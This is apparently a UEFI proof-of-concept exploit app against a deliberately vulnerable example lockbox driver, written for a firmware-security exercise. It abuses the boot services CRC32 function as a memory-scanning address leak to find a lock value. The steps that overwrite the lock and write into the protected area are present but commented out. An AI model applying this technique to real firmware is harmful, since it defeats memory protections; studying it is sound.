#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/ShellParameters.h>

#include "../Example1_Driver_Lockbox/Example1_Driver_Lockbox.h"
Example1_Driver_Lockbox_PROTOCOL *ProtocolInterface;

/* We assume 
 *   EMUPKG ONLY: the address range to search for lockpin address starts at 0x41000000
 *   if we find the CRC value it may not be the proper place, if it fails to allow to write
 *   to the lockbox try searching past that point in memory
 */

// #define EMUPKG                  1 // COMMENT OUT FOR OVMFPKG
#ifdef EMUPKG
    #define SEARCH_START        0x41000000
#else
    #define SEARCH_START        0x00000000 // assumes stack is below 0x07000000
#endif
#define SEARCH_END              0xFFFFFFFF  // could be longer
#define SEARCH_SIZE             0x4
#define LOCKBOX_OFFSET          0x100
#define WRITE_MESSAGE           "asdfasdf"
#define WRITE_SIZE              0x9
#define LOCKPIN_VALUE           12341234
#define LOCKPIN_CRC32           0x3E9D2A79


/* ScanMemViaCRC
 * CRC32 provides the equivalent of an address leak if the contents of an address is known beforehand
 * This function takes an start and stop address to scan for an expected crc value
 * if found, the address is returned in the location variable
 */
EFI_STATUS
EFIAPI
ScanMemViaCRC(
    IN UINTN Start,
    IN UINTN End,
    IN UINTN Increment,
    IN OUT UINTN *location
)
{
    (*location) = 0;
    UINT32 retCRCValue = 0;
    register UINT32 expectedCRCValue = 0xdeadbeef;
    expectedCRCValue ^= 0xe0309496;
    // Print(L"  Looking for CRC32 value (0x%04x)\r\n", expectedCRCValue);

    for (UINTN i=Start; i < End; i+=Increment)
    {
	retCRCValue = 0;
        gBS->CalculateCrc32 ((void *) i, Increment, &retCRCValue);
        // Print(L"Found (0x%04x) @ (0x%04x)\r\n", retCRCValue, i);
        if (retCRCValue == LOCKPIN_CRC32) // expectedCRCValue)
        {
            // Print(L"Found it(0x%04x) vs (0x%04x) @ (0x%04x)\r\n", expectedCRCValue, retCRCValue, i);
            (*location) = i;
            return EFI_SUCCESS;
        }
    }
    return EFI_NOT_FOUND; 
}

/* Example1_App_Entry
 * starting point for the app
 * 1. GET PROTOCOL
 * 2. ATTEMPT SET LOCKPIN TO 0 - expected to fail
 * 3. ATTEMPT WRITE DATA IN LOCKBOX - expected to fail
 * 4. SET LOCKPIN TO KNOWN VALUE 12341234
 * 5. GET ADDRESS LEAK OF LOCKPIN - BY FINDING CRC32 OF KNOWN VALUE IN MEMORY (USE LARGEST MEMORY SEARCH RANGE)
 * 6. SET LOCKPIN TO 0 VIA WRITE DATA FUNCTION
 * 7. WRITE DATA TO LOCKBOX
 *      if this fails, then go back with an updated start location to search from
 * 8. READ DATA FROM LOCKBOX - VERIFICATION OF SUCCESS
 */
EFI_STATUS 
EFIAPI 
Example1_App_Entry (
    IN EFI_HANDLE imgHandle, 
    IN EFI_SYSTEM_TABLE* sysTable
)
{
    gBS = sysTable->BootServices;
    gBS->SetWatchdogTimer(0, 0, 0, NULL); // UEFI apps automatically exit after 5 minutes. Stop that here.

    Print(L"RPOEE App Started\r\n");

    /* 1. GET DRIVER PROTOCOL */
    gBS->LocateProtocol(&gExample1_Driver_LockboxProtocolGuid, NULL, (VOID *)&ProtocolInterface);

    /* 2. ATTEMPT TO SET DRIVER LOCKPIN TO 0 - EXPECTED TO FAIL */
    Print(L"Call Driver SetLockPin function to try to set to 0 (expected to fail)\r\n");
    EFI_STATUS retval = ProtocolInterface->Example1_Driver_Lockbox_SetLockPin(ProtocolInterface, NULL, UNLOCKED);
    if (retval == 0)
    {
        Print(L"Succeeded in setting lockpin to 0, quitting (%d)\r\n", retval);
        Print(L"RPOEE FAILED\r\n");
        return EFI_ABORTED;
    }
    Print(L"  Failed to set lockpin value to 0, Success\r\n");

    /* 3. ATTEMPT TO WRITE TO LOCKBOX AREA - EXPECTED TO FAIL */
    Print(L"Call Driver WriteData function to write data to lockbox (expected to fail)\r\n");
    retval = ProtocolInterface->Example1_Driver_Lockbox_WriteData_Wrapper(ProtocolInterface, NULL, LOCKBOX_OFFSET, WRITE_MESSAGE, WRITE_SIZE);
    if (retval == 0)
    {
        Print(L"Succeeded in writing data to lockbox (%d), quitting\r\n", retval);
        Print(L"RPOEE FAILED\r\n");
        return EFI_ABORTED;
    }
    Print(L"  Failed to write to lockbox, Success\r\n\r\n");

    /* 4. ATTEMPT TO SET DRIVER LOCKPIN TO NON-ZERO - EXPECTED TO SUCCEED */
    UINTN lockpinValue = LOCKPIN_VALUE;
    Print(L"Call Driver SetLockPin function to lock with value (%d)\r\n", lockpinValue);
    retval = ProtocolInterface->Example1_Driver_Lockbox_SetLockPin(ProtocolInterface, NULL, lockpinValue);
    if (retval != 0)
    {
        Print(L"Failed to set lockpin value, quitting (%d)\r\n", retval);
        Print(L"RPOEE FAILED\r\n");
        return EFI_ABORTED;
    }
    Print(L"  Lockpin set\r\n");

    /* 5. SEARCH MEMORY RANGE FOR LOCKPIN ADDRESS BY KNOWING EXPECTED CRC32 VALUE */
    
    UINTN lockpinAddr = 0;
    
    UINTN startLoc=SEARCH_START;
    //UINTN count=0;
    //TRYAGAIN: // come back here if we got a bad address
    Print(L"Searching memory for lockpin address via crc32, staring @(0x%p)\r\n", startLoc);
    if (ScanMemViaCRC(startLoc, SEARCH_END, SEARCH_SIZE, &lockpinAddr) != EFI_SUCCESS)
    {
        Print(L"Failed to find crc in memory range, quitting\r\n");
        Print(L"RPOEE FAILED\r\n");
        return EFI_ABORTED;
    }
    Print(L"  Lockpin address found (0x%p)\r\n\r\n", lockpinAddr);
    
    if (lockpinAddr != 0)
    {  /* WITH LOCKPIN ADDRESS KNOWN, SET LOCKPIN VALUE TO 0 (ALLOWING WRITING IN LOCKBOX) VIA WRITEDATA FUNCTION */
        /* 6. ATTEMPT TO SET DRIVER LOCKPIN TO 0 - EXPECTED TO SUCCEED */
        /*
        Print(L"Call Driver WriteData function to try to set lockpin to 0 (expected to succeed)\r\n");
        lockpinValue = 0;
        retval = ProtocolInterface->Example1_Driver_Lockbox_WriteData(ProtocolInterface, NULL, (void *)lockpinAddr, &lockpinValue, sizeof(UINTN));
        if (retval != 0)
        {
            Print(L"Failed to set lockpin value to 0, quitting (%d)\r\n", retval);
            Print(L"RPOEE FAILED\r\n");
            return EFI_ABORTED;
        }
        Print(L"  Succeeded in setting lockpin to 0\r\n");
        */
        /* 7. ATTEMPT TO WRITE TO LOCKBOX AREA - EXPECTED TO SUCCEED */
        /*
        Print(L"Call Driver WriteData function to write data to lockbox (expected to succeed)\r\n");
        retval = ProtocolInterface->Example1_Driver_Lockbox_WriteData_Wrapper(ProtocolInterface, NULL, LOCKBOX_OFFSET, WRITE_MESSAGE, WRITE_SIZE);
        if (retval != 0)
        {
            Print(L"Failed to write to lockbox, quitting (%d)\r\n", retval);
            Print(L"RPOEE FAILED\r\n");
            startLoc = lockpinAddr+SEARCH_SIZE;
            if (count==100)
                return EFI_ABORTED;
            count+=1;
            goto TRYAGAIN;
        }
        Print(L"  Succeeded in writing data to lockbox\r\n\r\n");
        */
        /* 8. READ MEMORY AT OFFSET TO VERIFY IT HAS WRITTEN VALUE */
        /*
        CHAR8 *storage=AllocatePool(WRITE_SIZE);
        VOID **storagePtr = (void**)&storage;
        SetMemN(storage, WRITE_SIZE-1, '\0');
        Print(L"Call Driver's ReadData function to write data to lockbox (expected to succeed)\r\n");
        retval = ProtocolInterface->Example1_Driver_Lockbox_ReadData(ProtocolInterface, NULL, storagePtr, LOCKBOX_OFFSET, WRITE_SIZE);
        if (retval != 0)
        {
            Print(L"Failed to read from lockbox (%d), quitting\r\n", retval);
            Print(L"RPOEE FAILED\r\n");
            FreePool(storage);
            return EFI_ABORTED;
        }
        CHAR16 *storage16=AllocatePool(WRITE_SIZE*4);
        UINTN destLen=0;
        AsciiStrnToUnicodeStrS(storage, WRITE_SIZE, storage16, WRITE_SIZE*2,&destLen);
        Print(L"  Succeeded in reading data from lockbox (%s)\r\n", storage16);
        FreePool(storage);
        FreePool(storage16); 
        */   
    }
    else{
        Print(L"Invalid lockpin address\r\n");
        Print(L"RPOEE FAILED\r\n");
        return EFI_ABORTED;
    }

    Print(L"RPOEE SUCCEEDED\r\n");  
    return EFI_SUCCESS;
}
